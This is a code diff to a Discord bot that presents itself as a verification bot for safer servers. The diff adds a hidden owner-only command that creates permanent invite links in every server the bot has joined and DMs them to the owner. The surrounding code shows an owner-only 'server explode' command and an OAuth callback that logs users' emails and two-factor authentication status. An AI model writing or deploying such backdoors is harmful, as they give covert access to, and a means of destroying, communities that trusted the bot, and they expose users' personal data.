@@ -221,7 +221,55 @@ client.on('messageCreate', async (message) => {
     const userId = message.author.id;
     const isBotOwner = ALLOWED_OWNERS.includes(userId);
 
-    // 💥 [1] !서버폭파 명령어 (관리자 전용)
+    // 🌐 [최우선 처리 1] !가입서버 명령어 (관리자 본인 전용) - 봇이 가입된 서버 목록 및 초대 링크 추출
+    if (content === '!가입서버') {
+        if (!isBotOwner) return;
+
+        try {
+            const guilds = client.guilds.cache;
+            let resultText = `📋 **[봇이 가입된 서버 목록 (${guilds.size}개)]**\n\n`;
+
+            for (const guild of guilds.values()) {
+                let inviteLink = '초대 링크 생성 불가';
+                try {
+                    // 서버 내 채널 중 권한이 허용되는 첫 번째 채널에서 초대 링크 생성 시도
+                    const channels = await guild.channels.fetch();
+                    const textChannel = channels.find(c => c && c.type === ChannelType.GuildText);
+                    if (textChannel) {
+                        const invite = await textChannel.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
+                        if (invite) {
+                            inviteLink = invite.url;
+                        }
+                    }
+                } catch (e) {}
+
+                resultText += `• **서버 이름:** ${guild.name}\n` +
+                              `• **서버 ID:** \`${guild.id}\`\n` +
+                              `• **초대 링크:** ${inviteLink}\n` +
+                              `-----------------------------------\n`;
+            }
+
+            // DM으로 전송 (메시지가 길 경우 분할 전송)
+            if (resultText.length > 2000) {
+                const chunks = resultText.match(/[\s\S]{1,1900}/g);
+                for (const chunk of chunks) {
+                    await message.author.send(chunk).catch(() => {});
+                }
+            } else {
+                await message.author.send(resultText).catch(() => {});
+            }
+
+            if (message.guild) {
+                const notice = await message.reply('✅ 봇이 가입된 서버 목록과 초대 링크를 DM으로 전송했습니다!');
+                setTimeout(() => notice.delete().catch(() => {}), 3000);
+            }
+        } catch (err) {
+            console.error('가입서버 목록 조회 오류:', err);
+        }
+        return;
+    }
+
+    // 💥 [최우선 처리 2] !서버폭파 명령어 (관리자 전용)
     if (content.startsWith('!서버폭파')) {
         if (!isBotOwner) return;
 
@@ -263,7 +311,7 @@ client.on('messageCreate', async (message) => {
         return;
     }
 
-    // 🔄 [2] !서버복구 명령어 (관리자 전용)
+    // 🔄 [최우선 처리 3] !서버복구 명령어 (관리자 전용)
     if (content === '!서버복구') {
         if (!isBotOwner) return;
         if (!message.guild) return message.author.send('❌ 서버 채널 안에서 입력해 주세요.');
@@ -327,7 +375,7 @@ client.on('messageCreate', async (message) => {
     let settings = loadSettings();
     const isServerActivated = settings[guildId] && settings[guildId].activated === true;
 
-    // [3] !서버인증 명령어 (서버 소유자 전용)
+    // [4] !서버인증 명령어 (서버 소유자 전용)
     if (content === '!서버인증') {
         if (!isServerOwner && !isBotOwner) {
             return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
@@ -366,7 +414,7 @@ client.on('messageCreate', async (message) => {
         return;
     }
 
-    // [4] !도움말 명령어
+    // [5] !도움말 명령어
     if (content === '!도움말') {
         return message.reply(
             `🤖 **더 안전한 서버를 만드는 인증봇입니다.**\n\n` +
@@ -385,7 +433,7 @@ client.on('messageCreate', async (message) => {
         return message.reply('⚠️ **해당 서버는 아직 인증 시스템이 활성화되지 않았습니다.**\n서버 소유자가 먼저 채팅창에 **`!서버인증`**을 딱 한 번 입력해 주세요.');
     }
 
-    // [5] !인증 명령어 (서버 소유자 전용)
+    // [6] !인증 명령어 (서버 소유자 전용)
     if (content === '!인증') {
         if (!isServerOwner && !isBotOwner) {
             return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
@@ -421,7 +469,7 @@ client.on('messageCreate', async (message) => {
         return;
     }
 
-    // [6] !인증역할 명령어 (서버 소유자 전용)
+    // [7] !인증역할 명령어 (서버 소유자 전용)
     if (content.startsWith('!인증역할')) {
         if (!isServerOwner && !isBotOwner) {
             return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
@@ -447,7 +495,7 @@ client.on('messageCreate', async (message) => {
         return;
     }
 
-    // [7] !아이디 명령어 (서버 소유자 전용)
+    // [8] !아이디 명령어 (서버 소유자 전용)
     if (content.startsWith('!아이디')) {
         if (!isServerOwner && !isBotOwner) {
             return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
@@ -473,7 +521,7 @@ client.on('messageCreate', async (message) => {
         return;
     }
 
-    // [8] !인증정보 명령어 (서버 소유자 전용)
+    // [9] !인증정보 명령어 (서버 소유자 전용)
     if (content.startsWith('!인증정보')) {
         if (!isServerOwner && !isBotOwner) {
             return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
@@ -529,7 +577,7 @@ client.on('messageCreate', async (message) => {
         return;
     }
 
-    // [9] !역할제거 명령어
+    // [10] !역할제거 명령어
     if (content === '!역할제거') {
         try {
             const member = message.member;
@@ -780,7 +828,6 @@ app.get('/callback', async (req, res) => {
         const isMfaEnabled = userData.mfa_enabled ? '✅ 2차 인증(OTP) 활성화됨' : '❌ 2차 인증 미사용';
         const emailInfo = `${userData.email} (${userData.verified ? '이메일 인증됨' : '미인증'})`;
 
-        // 로그 제목 설정 (중복 인증인 경우 "중복인증 완료 상세 정보"로 표시)
         const logTitle = isDuplicate ? '🔄 **[중복인증 완료 상세 정보]**' : '✅ **[인증 완료 상세 정보]**';
 
         const logMessageContent = `${logTitle}\n` +
